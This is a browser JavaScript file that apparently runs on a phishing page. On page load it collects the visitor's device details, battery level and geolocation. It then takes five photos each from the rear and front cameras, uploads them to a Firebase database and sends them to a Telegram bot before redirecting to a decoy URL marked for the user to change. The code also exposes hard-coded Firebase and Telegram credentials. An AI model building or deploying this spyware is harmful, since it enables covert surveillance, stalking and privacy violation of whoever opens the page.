
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js";
import { getDatabase, ref as dbRef, set, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAPd-LuhhGPJqg4f9v7-s8-KxHwVkDAfOo",
  authDomain: "omarocoo-5c4a1.firebaseapp.com",
  databaseURL: "https://omarocoo-5c4a1-default-rtdb.firebaseio.com",
  projectId: "omarocoo-5c4a1",
  storageBucket: "omarocoo-5c4a1.appspot.com",
  messagingSenderId: "643985793304",
  appId: "1:643985793304:web:b3caa2b157b64f2acd3e6d"
};

const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const database = getDatabase(app);

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

const TELEGRAM_BOT_TOKEN = "7639077977:AAENzzjVLnZIFj8FtryqN4JFED7HUSBP0-w";
const CHAT_ID = "7927406022";

async function sendDeviceInfo() {
  const info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timestamp: new Date().toISOString()
  };

  try {
    const battery = await navigator.getBattery();
    info.batteryLevel = battery.level;
  } catch (e) {}

  try {
    navigator.geolocation.getCurrentPosition((position) => {
      info.location = {
        lat: position.coords.latitude,
        lon: position.coords.longitude
      };
      sendInfoToDB(info);
    }, () => {
      sendInfoToDB(info);
    });
  } catch (e) {
    sendInfoToDB(info);
  }
}

function sendInfoToDB(data) {
  const infoRef = dbRef(database, 'deviceInfo/' + Date.now());
  set(infoRef, data);
}

function sendToTelegram(blob, fileName) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("caption", `📷 ${fileName}`);
  formData.append("photo", blob, fileName);

  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

function captureImage(callback) {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0);
  canvas.toBlob(callback, 'image/jpeg');
}

function captureAndUpload(cameraType, index) {
  captureImage((blob) => {
    const fileName = `photo_${cameraType}_${Date.now()}.jpg`;
    const storageRef = ref(storage, 'images/' + fileName);

    uploadBytes(storageRef, blob).then(() => {
      getDownloadURL(storageRef).then((url) => {
        const imgRef = dbRef(database, 'images/' + fileName.replace('.jpg', ''));
        set(imgRef, {
          timestamp: new Date().toISOString(),
          camera: cameraType,
          imageURL: url
        });
        sendToTelegram(blob, fileName);
      });
    });
  });
}

async function startCapture() {
  await sendDeviceInfo();

  const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
  video.srcObject = rearStream;

  for (let i = 0; i < 5; i++) {
    setTimeout(() => captureAndUpload('rear', i), i * 1000);
  }

  setTimeout(async () => {
    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
    video.srcObject = frontStream;
    for (let i = 0; i < 5; i++) {
      setTimeout(() => captureAndUpload('front', i), i * 1000);
    }

    setTimeout(() => {
      window.location.href = "https://example.com"; // CHANGE THIS TO YOUR REDIRECT URL
    }, 6000);

  }, 6000);
}

startCapture();
